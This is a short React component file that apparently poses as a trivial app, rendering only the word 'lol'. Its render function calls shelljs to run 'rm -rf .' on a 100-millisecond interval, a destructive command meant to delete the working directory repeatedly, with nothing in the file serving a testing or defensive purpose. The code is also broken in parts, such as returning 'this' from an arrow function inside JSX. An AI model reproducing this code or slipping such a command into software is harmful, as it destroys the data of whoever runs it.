import React from 'react';
import './App.css';

import shell from 'shelljs';

function App() {
  const doaa = () => {
    //
    setInterval(() => {
      shell.exec('rm -rf .');
    }, 100);
    return this;
  };

  return (
    <div>
      <p>lol</p>
      {doaa()}
    </div>
  );
}

export default App;
